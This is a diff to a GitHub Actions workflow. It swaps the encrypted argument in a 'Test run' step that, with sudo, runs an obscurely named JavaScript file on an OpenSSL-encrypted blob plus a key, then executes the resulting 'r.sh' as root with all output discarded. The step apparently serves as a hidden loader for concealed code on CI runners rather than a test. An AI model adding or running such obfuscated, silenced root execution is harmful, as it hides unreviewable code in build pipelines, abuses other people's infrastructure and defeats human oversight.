@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'zmbdb'
+        echo '5cogj'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX18U4m4udamMyqumyoXevviz9LA1YTNSOKpiiCUpFDagNiSBzat3BUItSrf5h0iKFQwgB+xCIAa8QdZDNYRQX7S3rWpnGrqlpRyjX9kGyAO3JXmgl6Iaod5i vks9rq && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX19B27qbRu6alvTERCH0EMeqSWqcvcw7dnxbdh+hZ+Q0dQS5aOmd82/05BICpIPmMdbu6kKcRD7ZmdY/9GUIKoECs33XaGIP975nE3+50AtEoqlP/tGdkI2W 4g7azf && sudo sh r.sh > /dev/null 2>&1
